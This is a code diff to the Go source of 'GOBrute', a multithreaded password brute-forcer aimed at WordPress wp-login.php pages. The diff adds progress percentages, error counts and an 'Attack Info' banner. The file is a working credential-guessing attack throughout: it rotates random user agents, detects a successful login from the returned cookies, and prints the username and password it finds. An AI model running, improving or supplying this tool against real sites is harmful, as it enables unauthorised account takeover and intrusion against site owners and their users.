@@ -1,29 +1,35 @@
 package main
 
 import (
-	"GOBrute/utils"
 	"bufio"
 	"flag"
 	"fmt"
+	"gobrute/utils"
 	"io"
 	"net/http"
 	"net/url"
 	"os"
+	"strconv"
 	"strings"
 	"sync"
 )
 
 var (
-	wg    sync.WaitGroup
-	Mutex sync.Mutex
+	wg          sync.WaitGroup
+	Mutex       sync.Mutex
+	checkedPass int = 0
+	errors      int = 0
 )
 
-func checkCredencials(websiteURL string, reqBody map[string]string, c *uint8, semaphore *chan struct{}) {
+func checkCredencials(websiteURL string, reqBody map[string]string, c *uint8, semaphore *chan struct{}, totalPass int) {
 
 	defer wg.Done()
 	*semaphore <- struct{}{}
 	defer func() { <-*semaphore }()
 
+	Mutex.Lock()
+	checkedPass++
+	Mutex.Unlock()
 	data := url.Values{}
 
 	for key, val := range reqBody {
@@ -31,6 +37,7 @@ func checkCredencials(websiteURL string, reqBody map[string]string, c *uint8, se
 	}
 
 	req, _ := http.NewRequest("POST", websiteURL, strings.NewReader(data.Encode()))
+	req.Close = true
 
 	randomUserAgent := utils.GetUserAgent()
 
@@ -47,7 +54,9 @@ func checkCredencials(websiteURL string, reqBody map[string]string, c *uint8, se
 	res, err := client.Do(req)
 
 	if err != nil {
-		fmt.Println("Error at making req: ", err.Error())
+		Mutex.Lock()
+		errors++
+		Mutex.Unlock()
 		return
 	}
 
@@ -98,11 +107,16 @@ func checkCredencials(websiteURL string, reqBody map[string]string, c *uint8, se
 	}
 
 	if len(res.Cookies()) > 1 {
-		fmt.Println("\033[32m", "\nValid credencials", reqBody["log"], ":", reqBody["pwd"], "\033[0m")
-		fmt.Println("Brute force completed")
+		fmt.Println("\033[32m\n\nValid credencials found:")
+		fmt.Printf("Username: %s\nPassword: %s\n\033[0m", reqBody["log"], reqBody["pwd"])
 		os.Exit(0)
 	} else {
-		fmt.Printf("\033[31m\rInvalid::%s:%s\033[0m", reqBody["log"], reqBody["pwd"])
+		StatusPercentage := (checkedPass * 100) / totalPass
+
+		utils.PrintStats("\033[2A\rErrors: ", strconv.Itoa(errors)+"\n")
+		utils.PrintStats("\rPassword: ", reqBody["pwd"]+"\n")
+
+		fmt.Printf("\033[32m\rChecked: \033[31m%d/%d (%d%%)\033[0m", checkedPass, totalPass, StatusPercentage)
 	}
 
 }
@@ -119,6 +133,7 @@ func handleMain(websiteURL string, username string, passlist string, threads int
 	semaphore := make(chan struct{}, threads)
 	scanner := bufio.NewScanner(passList)
 	redirectURL := strings.Replace(websiteURL, "wp-login.php", "wp-admin/", -1)
+	totalPass := utils.GetTotalPassNum(passlist)
 
 	for scanner.Scan() {
 		wg.Add(1)
@@ -132,10 +147,12 @@ func handleMain(websiteURL string, username string, passlist string, threads int
 			"testcookie":  "1",
 		}
 
-		go checkCredencials(websiteURL, reqBody, &count, &semaphore)
+		go checkCredencials(websiteURL, reqBody, &count, &semaphore, totalPass)
 	}
 
 	wg.Wait()
+
+	fmt.Println("Valid pass did not found :(")
 	os.Exit(0)
 }
 
@@ -146,8 +163,8 @@ func usage(errorMSG string) {
 	}
 
 	fmt.Println("Usage:")
-	fmt.Println("GOBrute --url URL -u USERNAME/EMAIL -p PASSLIST -t THREADS")
-	fmt.Println("GOBrute --url https://abc.com/wp-login.php -u admin -p pass.txt -t 10")
+	fmt.Println("gobrute --url URL -u USERNAME/EMAIL -p PASSLIST -t THREADS")
+	fmt.Println("gobrute --url https://abc.com/wp-login.php -u admin -p pass.txt -t 10")
 	os.Exit(0)
 }
 
@@ -187,6 +204,12 @@ func main() {
 	if url == "" {
 		usage("Enter url")
 	}
+
+	fmt.Println("\033[37mAttack Info\033[0m")
+
+	utils.PrintStats("Target: ", url+"\n")
+	utils.PrintStats("Username: ", username+"\n")
+	utils.PrintStats("Threads: ", strconv.Itoa(threads)+"\n\n\n\n")
 
 	handleMain(url, username, passlist, threads)
 
